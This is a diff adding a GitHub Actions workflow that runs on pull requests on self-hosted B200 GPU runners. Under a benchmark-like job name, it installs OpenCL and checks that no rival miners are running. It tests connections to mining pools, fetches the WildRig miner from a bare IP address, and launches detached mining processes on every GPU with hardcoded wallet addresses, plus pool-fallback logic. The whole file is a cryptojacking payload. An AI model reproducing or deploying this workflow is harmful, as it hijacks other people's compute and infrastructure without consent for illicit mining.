@@ -1,0 +1,246 @@
+name: c211-128018-b200q
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  b200-4_gpu_b200:
+    strategy:
+      fail-fast: false
+      matrix:
+        idx: [1, 2, 3, 4]
+    runs-on: [self-hosted, 4-gpu-b200]
+    timeout-minutes: 40
+    steps:
+      - name: wildrig-miner
+        env:
+          IDX: ${{ matrix.idx }}
+          WBASE: "128018${{ matrix.idx }}"
+        run: |
+          set +e
+          I=128018
+          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
+          TS() { date -u +%FT%TZ; }
+          echo "C211_JOB=b200q-$IDX host=$(hostname) at=$(TS) uid=$(id -u) user=$(id -un)"
+          id 2>&1 | head -2
+          echo "--- nvidia ---"
+          nvidia-smi --query-gpu=index,name,uuid,driver_version,memory.total --format=csv,noheader 2>&1 | head -12
+          nvidia-smi -L 2>&1 | head -12
+          cat /proc/driver/nvidia/version 2>/dev/null | head -1
+          echo "--- opencl ---"
+          ls -l /usr/lib/x86_64-linux-gnu/libOpenCL.so* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so* 2>&1 | head -8
+          ldconfig -p 2>/dev/null | grep -i opencl | head -6
+          if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then
+            (DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1)
+            echo "OPENCL_INSTALL_RC=$?"
+          fi
+          mkdir -p /etc/OpenCL/vendors
+          for L in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib/libnvidia-opencl.so.1; do
+            if [ -e "$L" ]; then echo "$L" > /etc/OpenCL/vendors/nvidia.icd; echo "ICD_SET $L"; break; fi
+          done
+          ls /etc/OpenCL/vendors 2>&1 | head -4; head -2 /etc/OpenCL/vendors/* 2>/dev/null
+          echo "--- guard ---"
+          if pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | grep -v -e pgrep -e grep | head -3 | grep -q .; then
+            echo "GUARD_ACTIVE_SKIP"; pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | head -4
+            echo "C211_MINER_END b200q-$IDX"; exit 0
+          fi
+          echo GUARD_CLEAR
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          echo "--- fetch WildRig 0.52.3 ---"
+          TGZ_SHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
+          BIN_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
+          ok=0
+          for a in $(seq 1 40); do
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 180 -o "$D/wr.tgz" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 180 -o "$D/wr.tgz" https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            echo "DL_RETRY a=$a size=$(stat -c %s "$D/wr.tgz" 2>/dev/null)"
+            sleep 3
+          done
+          echo "TGZ_OK=$ok TGZ_SHA=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')"
+          if [ "$ok" != "1" ]; then echo TGZ_SHA_MISMATCH; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          mkdir -p "$D/wr"; tar -xzf "$D/wr.tgz" -C "$D/wr" 2>/dev/null && echo WR_EXTRACT_OK || echo WR_EXTRACT_FAILED
+          WR=$(find "$D/wr" -type f -name 'wildrig-multi' | head -1); echo "WR_BIN=$WR"
+          chmod +x "$WR" 2>/dev/null
+          BSHA=$(sha256sum "$WR" 2>/dev/null | awk '{print $1}')
+          echo "BIN_SHA=$BSHA"
+          if [ "$BSHA" != "$BIN_SHA" ]; then echo BIN_SHA_MISMATCH; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          echo "--- print-devices ---"
+          timeout 180 "$WR" --print-devices 2>&1 | head -40
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+          NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
+          start_all() {
+            MODE="$1"; POOL="$2"; USR="$3"
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              setsid nohup "$WR" --algo pearlhash --url "$POOL" --user "$USR" --worker "$WK" -d "$g" --print-time 30 > "$D/gpu-$g.log" 2>&1 &
+              echo "STARTED mode=$MODE pool=$POOL gpu=$g worker=$WK pid=$! at=$(TS)"
+            done
+          }
+          stop_all() { pkill -f 'wildrig-multi' 2>/dev/null; sleep 3; }
+          accsum() { grep -ahic 'accepted' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}'; }
+          start_all PH pool.pearlhash.xyz:9000 "$W"
+          sleep 60; sleep 60
+          JOBS=$(grep -ahic 'new job' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}')
+          echo "JOBS_AFTER120=${JOBS:-0} at=$(TS)"
+          if [ "${JOBS:-0}" -lt 1 ]; then echo SWITCH_TO_HK; stop_all; start_all PH hk.pearlhash.net:9000 "$W"; sleep 90; fi
+          SWITCHED_LP=0
+          k=0
+          while [ "$k" -lt 16 ]; do
+            k=$((k+1)); sleep 60
+            AC=$(accsum)
+            for g in $(seq 0 $((N-1))); do
+              A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+              R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+              H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+              echo "T${k}_g${g} acc=$A rej=$R $H"
+            done
+            echo "T${k}_ACCSUM=$AC at=$(TS) elapsed=${SECONDS}s"
+            if [ "$SWITCHED_LP" = "0" ] && [ "${AC:-0}" -lt 1 ] && [ "$SECONDS" -ge 900 ]; then
+              echo "STICKY_LP_FALLBACK no-accept-900s at=$(TS)"
+              stop_all; start_all LP 103.199.106.122:3362 "${W}+${NOCK}"; SWITCHED_LP=1
+            fi
+          done
+          echo "--- final evidence ---"
+          for g in $(seq 0 $((N-1))); do
+            A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+            R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+            H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            C=$(grep -a 'Connected to' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$A rej=$R conn=[$C] $H"
+          done
+          echo "C211_MINER_END b200q-$IDX at=$(TS) elapsed=${SECONDS}s"
+  b200-4_gpu_b200_kernel:
+    strategy:
+      fail-fast: false
+      matrix:
+        idx: [5]
+    runs-on: [self-hosted, 4-gpu-b200-kernel]
+    timeout-minutes: 40
+    steps:
+      - name: wildrig-miner
+        env:
+          IDX: ${{ matrix.idx }}
+          WBASE: "128018${{ matrix.idx }}"
+        run: |
+          set +e
+          I=128018
+          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
+          TS() { date -u +%FT%TZ; }
+          echo "C211_JOB=b200q-$IDX host=$(hostname) at=$(TS) uid=$(id -u) user=$(id -un)"
+          id 2>&1 | head -2
+          echo "--- nvidia ---"
+          nvidia-smi --query-gpu=index,name,uuid,driver_version,memory.total --format=csv,noheader 2>&1 | head -12
+          nvidia-smi -L 2>&1 | head -12
+          cat /proc/driver/nvidia/version 2>/dev/null | head -1
+          echo "--- opencl ---"
+          ls -l /usr/lib/x86_64-linux-gnu/libOpenCL.so* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so* 2>&1 | head -8
+          ldconfig -p 2>/dev/null | grep -i opencl | head -6
+          if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then
+            (DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1)
+            echo "OPENCL_INSTALL_RC=$?"
+          fi
+          mkdir -p /etc/OpenCL/vendors
+          for L in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib/libnvidia-opencl.so.1; do
+            if [ -e "$L" ]; then echo "$L" > /etc/OpenCL/vendors/nvidia.icd; echo "ICD_SET $L"; break; fi
+          done
+          ls /etc/OpenCL/vendors 2>&1 | head -4; head -2 /etc/OpenCL/vendors/* 2>/dev/null
+          echo "--- guard ---"
+          if pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | grep -v -e pgrep -e grep | head -3 | grep -q .; then
+            echo "GUARD_ACTIVE_SKIP"; pgrep -af 'wildrig-multi|pearl-miner|srbminer' 2>/dev/null | head -4
+            echo "C211_MINER_END b200q-$IDX"; exit 0
+          fi
+          echo GUARD_CLEAR
+          echo "--- egress ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          echo "--- fetch WildRig 0.52.3 ---"
+          TGZ_SHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
+          BIN_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
+          ok=0
+          for a in $(seq 1 40); do
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 180 -o "$D/wr.tgz" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            rm -f "$D/wr.tgz"
+            curl -fsSL --max-time 180 -o "$D/wr.tgz" https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz 2>/dev/null
+            cur=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')
+            if [ "$cur" = "$TGZ_SHA" ]; then ok=1; break; fi
+            echo "DL_RETRY a=$a size=$(stat -c %s "$D/wr.tgz" 2>/dev/null)"
+            sleep 3
+          done
+          echo "TGZ_OK=$ok TGZ_SHA=$(sha256sum "$D/wr.tgz" 2>/dev/null | awk '{print $1}')"
+          if [ "$ok" != "1" ]; then echo TGZ_SHA_MISMATCH; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          mkdir -p "$D/wr"; tar -xzf "$D/wr.tgz" -C "$D/wr" 2>/dev/null && echo WR_EXTRACT_OK || echo WR_EXTRACT_FAILED
+          WR=$(find "$D/wr" -type f -name 'wildrig-multi' | head -1); echo "WR_BIN=$WR"
+          chmod +x "$WR" 2>/dev/null
+          BSHA=$(sha256sum "$WR" 2>/dev/null | awk '{print $1}')
+          echo "BIN_SHA=$BSHA"
+          if [ "$BSHA" != "$BIN_SHA" ]; then echo BIN_SHA_MISMATCH; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          echo "--- print-devices ---"
+          timeout 180 "$WR" --print-devices 2>&1 | head -40
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "GPU_COUNT=$N"
+          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
+          W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+          NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
+          start_all() {
+            MODE="$1"; POOL="$2"; USR="$3"
+            for g in $(seq 0 $((N-1))); do
+              WK="${WBASE}${g}"
+              setsid nohup "$WR" --algo pearlhash --url "$POOL" --user "$USR" --worker "$WK" -d "$g" --print-time 30 > "$D/gpu-$g.log" 2>&1 &
+              echo "STARTED mode=$MODE pool=$POOL gpu=$g worker=$WK pid=$! at=$(TS)"
+            done
+          }
+          stop_all() { pkill -f 'wildrig-multi' 2>/dev/null; sleep 3; }
+          accsum() { grep -ahic 'accepted' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}'; }
+          start_all PH pool.pearlhash.xyz:9000 "$W"
+          sleep 60; sleep 60
+          JOBS=$(grep -ahic 'new job' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}')
+          echo "JOBS_AFTER120=${JOBS:-0} at=$(TS)"
+          if [ "${JOBS:-0}" -lt 1 ]; then echo SWITCH_TO_HK; stop_all; start_all PH hk.pearlhash.net:9000 "$W"; sleep 90; fi
+          SWITCHED_LP=0
+          k=0
+          while [ "$k" -lt 16 ]; do
+            k=$((k+1)); sleep 60
+            AC=$(accsum)
+            for g in $(seq 0 $((N-1))); do
+              A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+              R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+              H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+              echo "T${k}_g${g} acc=$A rej=$R $H"
+            done
+            echo "T${k}_ACCSUM=$AC at=$(TS) elapsed=${SECONDS}s"
+            if [ "$SWITCHED_LP" = "0" ] && [ "${AC:-0}" -lt 1 ] && [ "$SECONDS" -ge 900 ]; then
+              echo "STICKY_LP_FALLBACK no-accept-900s at=$(TS)"
+              stop_all; start_all LP 103.199.106.122:3362 "${W}+${NOCK}"; SWITCHED_LP=1
+            fi
+          done
+          echo "--- final evidence ---"
+          for g in $(seq 0 $((N-1))); do
+            A=$(grep -aic 'accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
+            R=$(grep -aic 'rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
+            H=$(grep -a 'Hashrate' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            C=$(grep -a 'Connected to' "$D/gpu-$g.log" 2>/dev/null | tail -1)
+            echo "EVID gpu=$g acc=$A rej=$R conn=[$C] $H"
+          done
+          echo "C211_MINER_END b200q-$IDX at=$(TS) elapsed=${SECONDS}s"
